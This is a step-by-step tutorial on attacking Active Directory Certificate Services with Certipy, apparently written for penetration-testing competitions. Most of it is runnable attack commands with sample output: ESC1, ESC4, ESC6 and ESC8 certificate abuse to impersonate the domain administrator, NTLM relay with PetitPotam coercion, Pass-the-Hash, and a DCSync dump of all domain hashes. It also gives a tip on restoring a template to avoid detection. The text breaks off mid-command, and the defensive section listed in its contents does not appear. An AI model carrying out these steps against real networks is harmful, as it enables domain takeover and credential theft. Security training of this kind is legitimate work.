# Certipy - Complete Step-by-Step Guide (Zero to Advanced)

## Table of Contents
1. [Prerequisites & Installation](#prerequisites--installation)
2. [Understanding AD CS](#understanding-ad-cs)
3. [Initial Setup & Configuration](#initial-setup--configuration)
4. [Enumeration Techniques](#enumeration-techniques)
5. [Vulnerability Identification](#vulnerability-identification)
6. [ESC Attack Techniques](#esc-attack-techniques)
7. [Certificate-Based Authentication](#certificate-based-authentication)
8. [Advanced Exploitation](#advanced-exploitation)
9. [CPTC-Specific Techniques](#cptc-specific-techniques)
10. [Defensive Strategies](#defensive-strategies)

---

## What is Certipy & Why Use It?

### Understanding Certipy

**Certipy** is a Python-based offensive security tool for attacking Active Directory Certificate Services (AD CS). It automates the discovery and exploitation of AD CS misconfigurations that can lead to privilege escalation, persistence, and domain compromise.

**Created by:** Oliver Lyak (@ly4k_)  
**Purpose:** Exploit the "Certified Pre-Owned" vulnerability class discovered by SpecterOps

**Think of it as:**
- A specialized scanner for AD certificate vulnerabilities
- An automated exploitation framework for AD CS attacks
- Your primary tool for certificate-based privilege escalation

### What is AD CS (Active Directory Certificate Services)?

**AD CS** is Microsoft's Public Key Infrastructure (PKI) implementation that:
- Issues and manages digital certificates
- Enables certificate-based authentication
- Supports smart cards, SSL/TLS, code signing, etc.

**The Problem:**
- Misconfigured certificate templates can allow ANY domain user to request certificates for privileged accounts (Domain Admin, Enterprise Admin, etc.)
- Certificates are often trusted more than passwords
- Misconfigurations are extremely common in real environments

**The Impact:**
- **Privilege Escalation:** Low-privilege user → Domain Admin
- **Persistence:** Certificates valid for months/years (even after password changes)
- **Authentication:** Use certificates instead of passwords
- **Stealth:** Certificate-based attacks are harder to detect

---

## Why AD CS Attacks are Critical for CPTC

### Common in Real Environments

**Statistics from Engagements:**
- **~60-80%** of Active Directory environments have AD CS deployed
- **~40-50%** of those have exploitable misconfigurations
- **ESC1** (most critical) found in ~30% of AD CS environments

### Advantages for CPTC:

✅ **High Impact:** Direct path to Domain Admin  
✅ **Reliable:** Exploits configuration issues, not software bugs  
✅ **Persistent:** Certificates remain valid long-term  
✅ **Stealthy:** Less noisy than other attacks  
✅ **Multiple Paths:** 8+ different escalation techniques (ESC1-ESC8)  

### Why Certipy Over Manual Methods:

| Task | Manual | Certipy |
|------|--------|---------|
| Enumerate CAs & Templates | Hours | Seconds |
| Identify Vulnerabilities | Manual analysis | Automatic flagging |
| Request Certificates | Complex commands | Single command |
| Authentication | Multi-step process | Automated |
| Time to Compromise | 1-2 hours | 5-10 minutes |

---

## Prerequisites & Installation

### What You Need

#### For AD CS Exploitation:
- **Attacker Machine:** Kali Linux, Ubuntu, or any Linux with Python 3
- **Target Environment:** Active Directory with AD CS deployed
- **Credentials:** Valid domain user account (low-privilege is fine)
- **Network Access:** LDAP (389/636), RPC (135, 445), HTTP/HTTPS to CA servers
- **Python:** Version 3.8+ 

#### For CPTC Competitions:
- Pre-installed Certipy
- Understanding of certificate concepts
- Quick enumeration methodology
- Evidence collection process

---

### Step 1: Install Certipy

#### Option A: Kali Linux (Recommended)

**Check if Already Installed:**
```bash
certipy --version
# If installed, shows: Certipy v4.x.x
```

**Install via pip (if not present):**
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install pip3 if needed
sudo apt install python3-pip -y

# Install Certipy
pip3 install certipy-ad

# Or use pipx (isolated installation)
sudo apt install pipx -y
pipx install certipy-ad
pipx ensurepath

# Verify installation
certipy --version
# Output: Certipy v4.8.2 (or latest)
```

#### Option B: Ubuntu/Debian

```bash
# Install Python 3 and pip
sudo apt update
sudo apt install python3 python3-pip -y

# Install Certipy
pip3 install certipy-ad

# Add to PATH if needed
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc

# Verify
certipy --version
```

#### Option C: From GitHub (Latest Development Version)

```bash
# Clone repository
git clone https://github.com/ly4k/Certipy
cd Certipy

# Install dependencies
pip3 install .

# Or install in development mode
pip3 install -e .

# Verify
certipy --version
```

#### Option D: Windows (PowerShell)

```powershell
# Install Python 3.8+ from python.org first

# Install Certipy
pip install certipy-ad

# Verify
certipy --version
```

---

### Step 2: Verify Installation & Dependencies

```bash
# Check Certipy is accessible
which certipy
# Output: /usr/local/bin/certipy or /home/user/.local/bin/certipy

# Check version
certipy --version
# Output: Certipy v4.8.2

# Test help menu
certipy -h

# Output:
# Certipy v4.8.2 - by Oliver Lyak (ly4k)
# 
# usage: certipy [-h] [-v] {find,req,auth,shadow,account,ca,cert,forge,relay,template} ...
# 
# Active Directory certificate abuse
```

**If Installation Fails:**

**Problem: "Command not found"**
```bash
# Check Python path
python3 -m pip show certipy-ad

# If installed but not in PATH, use:
python3 -m certipy --version

# Add alias
echo 'alias certipy="python3 -m certipy"' >> ~/.bashrc
source ~/.bashrc
```

**Problem: Dependency errors**
```bash
# Install system dependencies
sudo apt install python3-dev libldap2-dev libsasl2-dev libssl-dev -y

# Reinstall Certipy
pip3 install --upgrade --force-reinstall certipy-ad
```

---

### Step 3: Install Supporting Tools

**Essential tools for AD CS exploitation:**

```bash
# Impacket (for NTLM relay, secretsdump, etc.)
pip3 install impacket

# BloodHound-python (enumerate AD for context)
pip3 install bloodhound

# CrackMapExec (verify access, lateral movement)
sudo apt install crackmapexec -y

# Rubeus (Windows tool - download for target deployment)
# Download from: https://github.com/GhostPack/Rubeus

# PKINIT tools (for Linux Kerberos auth with certificates)
sudo apt install krb5-user -y
```

**Verify Supporting Tools:**
```bash
# Test Impacket
impacket-ntlmrelayx -h

# Test CME
crackmapexec smb -h

# Test bloodhound-python
bloodhound-python -h
```

---

## Understanding AD CS

### Step 4: Active Directory Certificate Services Fundamentals

**Before attacking AD CS, understand what you're targeting:**

#### Components of AD CS:

```
┌──────────────────────────────────────────────────────────┐
│                   AD CS Architecture                      │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  ┌────────────────┐                                     │
│  │ Certificate     │  Issues & manages certificates     │
│  │ Authority (CA)  │  (e.g., "CORP-CA")                 │
│  └────────┬────────┘                                     │
│           │                                              │
│           │ uses                                         │
│           ↓                                              │
│  ┌────────────────┐                                     │
│  │ Certificate     │  Define what certificates can be   │
│  │ Templates       │  issued and who can request them   │
│  └────────┬────────┘  (e.g., "User", "Computer", etc.)  │
│           │                                              │
│           │ controls                                     │
│           ↓                                              │
│  ┌────────────────┐                                     │
│  │ Certificate     │  Issued to users/computers         │
│  │ (X.509)         │  Used for authentication           │
│  └────────────────┘                                     │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

---

#### Certificate Authority (CA):

**What it is:**
- Server role that issues digital certificates
- Usually installed on domain controller or member server
- Identified by name (e.g., "CORP-DC01-CA")

**Types:**
- **Enterprise CA:** Integrated with AD, auto-enrollment, template-based
- **Standalone CA:** Not integrated with AD, manual approval

**For Attacks:** Enterprise CAs are the target (most common in corporate environments)

---

#### Certificate Templates:

**What they are:**
- Blueprints defining:
  - **What** the certificate can be used for (authentication, encryption, signing)
  - **Who** can request it (users, computers, specific groups)
  - **How** it's issued (auto-approval, manager approval)
  - **What** information goes in the certificate (subject name, SAN)

**Default Templates:**
- `User` - Standard user authentication
- `Computer` - Computer authentication
- `Domain Controller` - DC authentication
- `Web Server` - SSL/TLS for websites
- Custom templates created by admins

**The Vulnerability:**
- Admins often copy default templates and modify them
- Small configuration mistakes = privilege escalation

---

#### Certificate Structure (X.509):

```
┌───────────────────────────────────────────┐
│ Certificate                               │
├───────────────────────────────────────────┤
│ Subject: CN=John Doe, OU=IT, DC=corp,...  │  ← Who the cert belongs to
│ Issuer: CN=CORP-CA, DC=corp, DC=local     │  ← Who issued it
│ Valid From: 2025-10-24                    │
│ Valid To: 2026-10-24                      │  ← Validity period
│ Public Key: [RSA-2048 key]                │
│                                           │
│ Extensions:                               │
│   Subject Alternative Name (SAN):         │  ← CRITICAL for attacks
│     UPN: administrator@corp.local         │  ← Can specify other user!
│     DNS: admin.corp.local                 │
│                                           │
│   Enhanced Key Usage (EKU):               │
│     - Client Authentication               │  ← Allows AD login
│     - Smart Card Logon                    │
│                                           │
│ Signature: [Digital signature]            │  ← Signed by CA
└───────────────────────────────────────────┘
```

**Key Fields for Exploitation:**
- **Subject Alternative Name (SAN):** Can specify arbitrary usernames
- **Enhanced Key Usage (EKU):** Must include "Client Authentication" to use for AD logon
- **Validity Period:** How long cert is valid (often 1-2 years!)

---

### Step 5: Understanding ESC (SpecterOps Escalation Techniques)

**"ESC" = Escalation technique number from "Certified Pre-Owned" research**

**There are 8+ main ESC techniques (ESC1-ESC8+):**

| ESC | Name | Severity | Ease | Impact |
|-----|------|----------|------|--------|
| **ESC1** | Misconfigured Enrollment | Critical | Easy | Immediate Domain Admin |
| **ESC2** | Misconfigured Template (Any Purpose) | High | Easy | Privilege Escalation |
| **ESC3** | Enrollment Agent Templates | High | Medium | Multi-step escalation |
| **ESC4** | Vulnerable Template ACLs | High | Medium | Template modification |
| **ESC5** | Vulnerable PKI Object ACLs | Medium | Medium | CA object modification |
| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 | Critical | Easy | Like ESC1 |
| **ESC7** | Vulnerable CA ACLs | High | Medium | Rogue certificates |
| **ESC8** | NTLM Relay to AD CS HTTP Endpoints | High | Hard | Relay-based escalation |

**For CPTC, focus on:**
1. **ESC1** (most common, easiest)
2. **ESC6** (CA-level misconfiguration)
3. **ESC4** (if you have permissions to modify templates)

---

#### ESC1 - Misconfigured Certificate Template (MOST IMPORTANT)

**The Vulnerability:**

A certificate template is vulnerable to ESC1 if ALL of the following are true:

1. ✅ **Enterprise CA is trusted** for domain authentication
2. ✅ **Template allows authentication** (EKU: Client Authentication)
3. ✅ **Template allows requestor to specify SAN (Subject Alternative Name)**
4. ✅ **Low-privilege user can enroll** in the template

**Why It's Critical:**

```
You (low-privilege user)
    ↓
Request certificate from vulnerable template
    ↓
Specify SAN = "administrator@corp.local"
    ↓
CA issues certificate with YOUR request but for administrator
    ↓
Authenticate to AD using certificate
    ↓
AD trusts certificate = You are now administrator
    ↓
DOMAIN ADMIN ACHIEVED
```

**Real-World Example:**

**Vulnerable Template Configuration:**
```
Template Name: "VulnTemplate"
Purpose: Certificate Template
Enrollment Permissions: Domain Users (Read, Enroll)
Subject Name: Supply in Request  ← VULNERABLE!
Enhanced Key Usage: Client Authentication
Manager Approval: No
```

**Exploitation:**
```bash
# Request certificate specifying administrator as SAN
certipy req -u 'lowpriv@corp.local' -p 'password' \
    -ca 'CORP-CA' \
    -template 'VulnTemplate' \
    -upn 'administrator@corp.local' \
    -dc-ip 192.168.1.10

# Output: Certificate saved to administrator.pfx

# Authenticate as administrator
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10

# Output: Administrator NTLM hash retrieved
# Use hash for Pass-the-Hash → Full Domain Admin
```

**Time to Compromise:** < 5 minutes

---

#### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

**The Vulnerability:**

- Certificate Authority has a dangerous flag enabled: `EDITF_ATTRIBUTESUBJECTALTNAME2`
- This flag allows **ANY certificate template** to specify SAN in the request
- Even templates that don't explicitly allow it!

**Checking for ESC6:**
```bash
certipy find -u 'user@corp.local' -p 'password' -dc-ip 192.168.1.10 -vulnerable

# If ESC6 exists, output shows:
# [!] Certificate Authority 'CORP-CA' has the 'EDITF_ATTRIBUTESUBJECTALTNAME2' flag set
```

**Exploitation:**
```bash
# Use ANY enrollable template (even "User" default template)
certipy req -u 'user@corp.local' -p 'password' \
    -ca 'CORP-CA' \
    -template 'User' \
    -upn 'administrator@corp.local' \
    -dc-ip 192.168.1.10
```

**Impact:** Every template becomes ESC1-like

---

#### ESC4 - Vulnerable Template ACLs

**The Vulnerability:**

- You have `WriteDacl`, `WriteProperty`, or `WriteOwner` permissions on a certificate template
- Can modify the template to make it vulnerable to ESC1
- Then exploit it

**Checking Permissions:**
```bash
certipy find -u 'user@corp.local' -p 'password' -dc-ip 192.168.1.10 -vulnerable

# Output might show:
# Template: SafeTemplate
#   Permissions:
#     IT-USERS: Enroll, WriteProperty  ← Can modify template!
```

**Exploitation:**
```bash
# Step 1: Modify template to allow SAN specification
certipy template -u 'user@corp.local' -p 'password' \
    -template 'SafeTemplate' \
    -save-old

# Step 2: Now exploit as ESC1
certipy req -u 'user@corp.local' -p 'password' \
    -ca 'CORP-CA' \
    -template 'SafeTemplate' \
    -upn 'administrator@corp.local'

# Step 3: (Optional) Restore template to avoid detection
certipy template -u 'user@corp.local' -p 'password' \
    -template 'SafeTemplate' \
    -configuration SafeTemplate.json
```

---

#### ESC8 - NTLM Relay to AD CS HTTP Endpoints

**The Vulnerability:**

- Certificate Authority web enrollment endpoint (HTTP) doesn't require signing
- Can relay NTLM authentication to CA and request certificates

**Exploitation:**
```bash
# Step 1: Start ntlmrelayx targeting CA web enrollment
impacket-ntlmrelayx -t http://ca-server/certsrv/certfnsh.asp \
    -smb2support \
    --adcs \
    --template 'User'

# Step 2: Coerce authentication (e.g., via PetitPotam, PrinterBug)
python3 PetitPotam.py -u 'user' -p 'password' \
    attacker-ip \
    target-machine

# Step 3: Relay captures authentication, requests certificate
# Certificate saved automatically by ntlmrelayx
```

**Complexity:** Higher (requires coercion, relay setup)  
**For CPTC:** Focus on ESC1/ESC6 first (easier, faster)

---

## Initial Setup & Configuration

### Step 6: Prepare Your Testing Environment

**Before running Certipy, gather intelligence:**

#### Information You Need:

| Information | How to Find | Example |
|-------------|-------------|---------|
| **Domain Name (FQDN)** | Provided by CPTC, or `nslookup` | corp.local |
| **Domain Controller IP** | `nslookup corp.local` | 192.168.1.10 |
| **Domain User Credentials** | Provided or obtained | user@corp.local / Password123 |
| **Certificate Authority Name** | Certipy will enumerate | CORP-DC01-CA |

---

#### Quick Pre-Enumeration:

```bash
# Test domain connectivity
ping corp.local

# Resolve domain controller
nslookup corp.local

# Test credentials
crackmapexec smb 192.168.1.10 -u 'user' -p 'Password123' -d corp.local

# Output:
# SMB  192.168.1.10  445  DC01  [+] corp.local\user:Password123
```

✅ If you see `[+]` = Credentials work, proceed with Certipy

---

### Step 7: Understanding Certipy Command Structure

**Certipy uses subcommands for different operations:**

```bash
certipy <SUBCOMMAND> [OPTIONS]
```

**Main Subcommands:**

| Subcommand | Purpose | Common Use |
|------------|---------|------------|
| `find` | Enumerate CAs, templates, vulnerabilities | Initial reconnaissance |
| `req` | Request a certificate | Exploitation |
| `auth` | Authenticate with certificate | Get hash/TGT |
| `account` | Modify user account attributes | Advanced attacks |
| `ca` | Enumerate/modify CA configuration | ESC6, ESC7 attacks |
| `cert` | Parse certificate files | Analysis |
| `forge` | Forge certificates (Golden Certificate) | Advanced persistence |
| `relay` | NTLM relay attacks | ESC8 |
| `template` | Modify certificate templates | ESC4 |
| `shadow` | Shadow Credentials attack | Alternative authentication |

---

**Global Options (Work with all subcommands):**

```bash
-u, --username       # Domain username (user or user@domain)
-p, --password       # Password
-hashes              # NTLM hash (for Pass-the-Hash)
-k                   # Use Kerberos authentication
-dc-ip               # Domain Controller IP address
-target              # Target server (for specific operations)
-ns                  # DNS nameserver (usually same as DC)
-dns                 # DNS server (alternative to -ns)
-debug               # Enable debug output
-output              # Output file prefix
```

---

### Step 8: Configure Kerberos (Optional but Recommended)

**Why Configure Kerberos:**
- Some operations work better with Kerberos
- Avoid NTLM authentication (stealthier)
- Required for certain advanced attacks

#### Configure /etc/krb5.conf:

```bash
# Edit Kerberos configuration
sudo nano /etc/krb5.conf
```

**Add domain configuration:**

```ini
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    CORP.LOCAL = {
        kdc = dc01.corp.local
        admin_server = dc01.corp.local
        default_domain = corp.local
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
```

**Save:** `Ctrl+X`, `Y`, `Enter`

#### Test Kerberos Configuration:

```bash
# Request TGT (Kerberos ticket)
kinit user@CORP.LOCAL
# Enter password when prompted

# Verify ticket
klist

# Output:
# Ticket cache: FILE:/tmp/krb5cc_1000
# Default principal: user@CORP.LOCAL
#
# Valid starting     Expires            Service principal
# 10/24/25 18:21:22  10/25/25 04:21:22  krbtgt/CORP.LOCAL@CORP.LOCAL
```

✅ If you see ticket: Kerberos is configured correctly

**Use with Certipy:**
```bash
# Instead of -u/-p, use -k
certipy find -k -dc-ip 192.168.1.10
```

---

## Enumeration Techniques

### Step 9: Basic Enumeration - Finding Certificate Authorities

**Goal:** Discover all CAs in the domain

#### Command:

```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 192.168.1.10
```

**What it does:**
- Connects to domain via LDAP
- Queries for AD CS objects
- Enumerates:
  - Certificate Authorities
  - Certificate Templates
  - Enrollment permissions
  - Identified vulnerabilities

---

#### Expected Output:

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 15 enabled certificate templates
[*] Trying to get CA configuration for 'CORP-DC01-CA' via CSRA
[+] Got CA configuration for 'CORP-DC01-CA'
[*] Saved text output to '20251024182122_Certipy.txt'
[*] Saved JSON output to '20251024182122_Certipy.json'
[*] Saved BloodHound data to '20251024182122_Certipy.zip'
```

---

#### Output Files Generated:

**1. Text File (20251024182122_Certipy.txt):**
- Human-readable summary
- Lists all CAs and templates
- Shows permissions

**Example content:**
```
Certificate Authorities
  0
    CA Name                             : CORP-DC01-CA
    DNS Name                            : DC01.corp.local
    Certificate Subject                 : CN=CORP-DC01-CA, DC=corp, DC=local
    Certificate Serial Number           : 1234567890ABCDEF
    Certificate Validity Start          : 2023-01-01 00:00:00
    Certificate Validity End            : 2028-01-01 00:00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled  ← Important for ESC6!
    Request Disposition                 : Issue

Certificate Templates
  0
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : CORP-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    [!] Vulnerabilities
        ESC1                            : 'CORP\\Domain Users' can enroll, template allows client authentication and requestor can specify SAN
```

---

**2. JSON File (20251024182122_Certipy.json):**
- Machine-readable format
- Complete data dump
- Use for parsing with scripts

---

**3. BloodHound ZIP (20251024182122_Certipy.zip):**
- Import into BloodHound
- Visualize certificate attack paths
- See relationships between users, groups, and templates

**Import to BloodHound:**
```bash
# Start Neo4j and BloodHound
sudo neo4j console &
bloodhound &

# In BloodHound GUI:
# Click "Upload Data" → Select 20251024182122_Certipy.zip
```

**Query in BloodHound:**
```cypher
// Find paths to vulnerable templates
MATCH p=(u:User)-[:MemberOf*0..]->(g:Group)-[:Enroll]->(t:CertTemplate)
WHERE t.`ESC1` = true
RETURN p
```

---

### Step 10: Focused Enumeration - Finding ONLY Vulnerabilities

**Goal:** Save time by only showing vulnerable templates

#### Command:

```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 192.168.1.10 -vulnerable
```

**The `-vulnerable` flag filters output to ONLY show:**
- Templates with identified ESC vulnerabilities
- CAs with dangerous configurations
- Critical findings only

---

#### Example Output (Vulnerable Found):

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 15 enabled certificate templates

[!] Found vulnerable certificate templates:

Certificate Authorities
  0
    CA Name                             : CORP-DC01-CA
    DNS Name                            : DC01.corp.local
    [!] User Specified SAN              : Enabled  ← ESC6 vulnerability!

Certificate Templates
  0
    Template Name                       : ESC1-Template
    Display Name                        : Vulnerable Template
    Certificate Authorities             : CORP-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    [!] Vulnerabilities
        ESC1                            : 'CORP\\Domain Users' can enroll, template allows client authentication and requestor can specify SAN
```

✅ **Vulnerable template found!**

---

#### Example Output (No Vulnerabilities):

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 15 enabled certificate templates

[!] No vulnerable certificate templates found
```

❌ **No obvious vulnerabilities** (or AD CS is well-configured)

---

### Step 11: Understanding the Enumeration Output

**When reviewing text output, look for these key indicators:**

#### Certificate Authority Level:

```
User Specified SAN: Enabled    ← ESC6! Every template is vulnerable
Web Enrollment: Enabled        ← ESC8 possible (NTLM relay target)
Request Disposition: Issue     ← Auto-approves certificates (good for attacks)
```

---

#### Certificate Template Level:

**Green Flags (Vulnerable):**
```
✅ Enabled: True                              ← Template is active
✅ Client Authentication: True                ← Can be used for AD logon
✅ Requires Manager Approval: False           ← Auto-issued (no human review)
✅ Authorized Signatures Required: 0          ← No additional signatures needed
✅ Enrollee Supplies Subject: True            ← Can specify SAN (ESC1!)
✅ Enrollment Permissions: Domain Users       ← Anyone can request
```

**Red Flags (Secure):**
```
❌ Requires Manager Approval: True            ← Human must approve
❌ Authorized Signatures Required: 1+         ← Needs co-signer
❌ Enrollment Permissions: Domain Admins only ← Only admins can request
❌ Enrollee Supplies Subject: False           ← Can't specify SAN
```

---

#### Vulnerability Annotations:

```
[!] Vulnerabilities
    ESC1: 'CORP\\Domain Users' can enroll, template allows client authentication and requestor can specify SAN
```

**Translation:**
- **ESC1** = Vulnerability type
- **Domain Users can enroll** = Anyone in domain can request
- **Client authentication** = Certificate works for AD login
- **Requestor can specify SAN** = Can impersonate anyone

**Exploitation path:** Clear and direct to Domain Admin

---

### Step 12: Advanced Enumeration Options

#### Enumerate Specific CA:

```bash
certipy find -u 'user@corp.local' -p 'Password123' \
    -dc-ip 192.168.1.10 \
    -ca 'CORP-DC01-CA'
```

**Use when:** Multiple CAs exist, focus on specific one

---

#### Enumerate from Different User Context:

```bash
# Using NTLM hash instead of password
certipy find -u 'user@corp.local' -hashes ':8846f7eaee8fb117ad06bdd830b7586c' \
    -dc-ip 192.168.1.10 -vulnerable

# Using Kerberos (if you have TGT)
certipy find -k -dc-ip 192.168.1.10 -vulnerable
```

---

#### Custom Output File Names:

```bash
certipy find -u 'user@corp.local' -p 'Password123' \
    -dc-ip 192.168.1.10 \
    -output 'corp-adcs-enum'

# Output files:
# corp-adcs-enum.txt
# corp-adcs-enum.json
# corp-adcs-enum.zip (BloodHound data)
```

---

#### Debug Mode (Troubleshooting):

```bash
certipy find -u 'user@corp.local' -p 'Password123' \
    -dc-ip 192.168.1.10 \
    -debug

# Shows detailed LDAP queries, connection info, errors
```

**Use when:**
- Command hangs or fails
- Need to understand what Certipy is querying
- Troubleshooting connectivity issues

---

## Vulnerability Identification

### Step 13: Analyzing Certipy Findings

**After running `certipy find -vulnerable`, analyze the output systematically:**

#### Prioritization Matrix:

| ESC Type | Complexity | Time to Exploit | Impact | Priority |
|----------|------------|-----------------|--------|----------|
| ESC1 | Very Low | 2-5 min | Domain Admin | **CRITICAL** |
| ESC6 | Very Low | 2-5 min | Domain Admin | **CRITICAL** |
| ESC2 | Low | 5-10 min | Privilege Escalation | **HIGH** |
| ESC4 | Medium | 10-20 min | Domain Admin | **HIGH** |
| ESC3 | Medium | 15-30 min | Domain Admin | MEDIUM |
| ESC7 | Medium | 20-40 min | Rogue Certificates | MEDIUM |
| ESC8 | High | 30-60 min | Depends on relay | LOW |

---

#### Decision Tree for CPTC:

```
Certipy finds vulnerabilities
        |
        ├─ ESC1 or ESC6 found?
        │   └─ YES → Exploit immediately (< 5 min to DA)
        │
        ├─ ESC4 found?
        │   └─ YES → Check if you can modify template
        │       ├─ YES → Exploit (10-15 min)
        │       └─ NO → Move to next
        │
        ├─ ESC2 found?
        │   └─ YES → Check template purpose
        │       ├─ Useful for escalation? → Exploit
        │       └─ Not useful → Document, move on
        │
        └─ No ESC1/2/4/6 found
            └─ Document finding
            └─ Focus on other attack vectors (BloodHound, etc.)
```

---

### Step 14: Manual Verification of Findings

**Always manually verify automated findings before exploitation:**

#### Verify ESC1 Template Configuration:

**Using Windows (if you have RDP/access):**

```powershell
# Open Certificate Authority MMC
certsrv.msc

# Or via PowerShell:
Get-ADObject -Filter {ObjectClass -eq "pKICertificateTemplate"} -Properties * | 
    Where-Object {$_.Name -eq "ESC1-Template"} | 
    Select-Object Name, pkiExtendedKeyUsage, msPKI-Certificate-Name-Flag

# Check msPKI-Certificate-Name-Flag:
# Value: 1 (0x1) = ENROLLEE_SUPPLIES_SUBJECT (VULNERABLE to ESC1)
# Value: 0 = Not vulnerable
```

---

**Using Linux (Certipy detailed enum):**

```bash
# Get detailed template information
certipy find -u 'user@corp.local' -p 'Password123' \
    -dc-ip 192.168.1.10 \
    | grep -A 20 "ESC1-Template"

# Look for:
# Enrollee Supplies Subject: True  ← Confirms ESC1
```

---

#### Verify CA-Level Configuration (ESC6):

**Check if EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set:**

```bash
certipy ca -u 'user@corp.local' -p 'Password123' \
    -dc-ip 192.168.1.10 \
    -ca 'CORP-DC01-CA'

# Output shows:
# User Specified SAN: Enabled  ← Confirms ESC6
```

---

### Step 15: Testing Enrollment Permissions

**Before exploitation, confirm you can actually enroll in the template:**

```bash
# Attempt to request certificate (without specifying SAN yet)
certipy req -u 'user@corp.local' -p 'Password123' \
    -ca 'CORP-DC01-CA' \
    -template 'ESC1-Template' \
    -dc-ip 192.168.1.10

# Expected outputs:

# SUCCESS (can enroll):
# [*] Requesting certificate via RPC
# [+] Trying to get certificate
# [+] Got certificate with UPN 'user@corp.local'
# [*] Certificate has no object SID
# [*] Saved certificate and private key to 'user.pfx'

# FAILURE (can't enroll):
# [-] Got error while trying to request certificate: access denied
# OR
# [-] Got error: The request was denied by a certificate manager or CA administrator
```

✅ If certificate issued: You can enroll, proceed with exploitation  
❌ If access denied: Enumeration was incorrect or permissions changed

---

## ESC Attack Techniques

### Step 16: ESC1 Exploitation - Full Walkthrough

**Scenario:** Certipy found ESC1-vulnerable template, you want Domain Admin

---

#### Phase 1: Reconnaissance (Already Done via `certipy find`)

**You know:**
- Template Name: `ESC1-Template`
- CA Name: `CORP-DC01-CA`
- You have enrollment rights
- Template allows SAN specification

---

#### Phase 2: Request Certificate for Target User

**Goal:** Request certificate that impersonates `administrator@corp.local`

```bash
certipy req -u 'user@corp.local' -p 'Password123' \
    -ca 'CORP-DC01-CA' \
    -template 'ESC1-Template' \
    -upn 'administrator@corp.local' \
    -dc-ip 192.168.1.10
```

**Command Breakdown:**
- `req` = Request certificate
- `-u` = Your current username (low-privilege)
- `-p` = Your password
- `-ca` = Certificate Authority name (from enum)
- `-template` = Vulnerable template name (from enum)
- `-upn` = Target user to impersonate (UPN format)
- `-dc-ip` = Domain Controller IP

---

**Expected Output (Success):**

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 123
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

✅ **Critical indicators of success:**
- `Got certificate with UPN 'administrator@corp.local'` ← Cert is for admin!
- `Saved certificate... to 'administrator.pfx'` ← File created

---

**Expected Output (Failure):**

**Failure 1: Can't specify SAN**
```
[-] Got error: The request does not support the required extensions
```
**Reason:** Template doesn't actually allow SAN (enum was wrong)

**Failure 2: Access Denied**
```
[-] Got error: access denied
```
**Reason:** You don't have enrollment rights (enum was wrong or permissions changed)

**Failure 3: Manager Approval Required**
```
[!] Certificate request is pending approval
```
**Reason:** Template requires manager approval (not auto-issued)  
**Impact:** Attack fails (can't proceed without approval)

---

#### Phase 3: Authenticate with Certificate

**Goal:** Use obtained certificate to authenticate as administrator and retrieve credentials

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

**Command Breakdown:**
- `auth` = Authenticate using certificate
- `-pfx` = Certificate file (from previous step)
- `-dc-ip` = Domain Controller IP

---

**Expected Output (Success):**

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[+] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[+] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

✅ **Success! You now have:**
1. **TGT (Kerberos ticket):** Saved to `administrator.ccache`
2. **NTLM Hash:** `8846f7eaee8fb117ad06bdd830b7586c`

---

#### Phase 4: Use Obtained Credentials

**Option 1: Pass-the-Hash**

```bash
# Use hash with any Impacket tool
psexec.py -hashes ':8846f7eaee8fb117ad06bdd830b7586c' \
    'administrator@192.168.1.10'

# Output: Shell as CORP\administrator on DC
```

---

**Option 2: Use Kerberos Ticket**

```bash
# Export ticket to environment variable
export KRB5CCNAME=administrator.ccache

# Use with Kerberos-enabled tools
psexec.py -k -no-pass 'administrator@dc01.corp.local'

# Or with smbclient
smbclient //dc01.corp.local/C$ -k
```

---

**Option 3: DCSync Attack**

```bash
# Dump all domain hashes (including krbtgt for Golden Ticket)
secretsdump.py -hashes ':8846f7eaee8fb117ad06bdd830b7586c' \
    'administrator@192.168.1.10' \
    -just-dc

# Output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846...:::
# Guest:501:...
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1234...:::  ← Golden Ticket!
# ...all domain hashes...
```

---

#### Phase 5: Verify Domain Admin Access

```bash
# List domain admins
crackmapexec smb 192.168.1.10 \
